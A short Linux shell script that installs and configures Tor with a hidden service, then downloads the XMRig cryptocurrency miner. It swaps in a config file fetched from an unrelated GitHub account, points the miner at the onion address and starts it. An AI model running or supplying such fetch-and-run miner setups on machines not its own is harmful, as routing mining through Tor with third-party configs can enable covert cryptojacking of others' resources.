wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
apt-get update
apt-get install tor deb.torproject.org-keyring torsocks
service tor stop

sed -i '75s/#HiddenServiceDir/HiddenServiceDir/ ' /etc/tor/torrc
sed -i '18s/#SOCKSPort/SOCKSPort/ ' /etc/tor/torrc
sed -i 's/#ORPort/ORPort/ ' /etc/tor/torrc
sed -i '76s/#HiddenServicePort/HiddenServicePort/ ' /etc/tor/torrc
sed -i '76s/80/8080/g ' /etc/tor/torrc

systemctl enable tor
service tor start

wget https://github.com/xmrig/xmrig/releases/download/v6.13.1/xmrig-6.13.1-linux-x64.tar.gz && tar xf xmrig-6.13.1-linux-x64.tar.gz && cd xmrig-6.13.1 && rm -rf config.json && ls
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/config.json

cd xmrig-6.13.1
sed -i '4d' config.json
cat /var/lib/tor/other_hidden_service/hostname | sed '1s/^/4i /' | sed -i -f- config.json
sed -i '4s/$/",/ ' config.json 
sed -i '4s|^|        "host": "|' config.json



chmod +x xmrig && ./xmrig
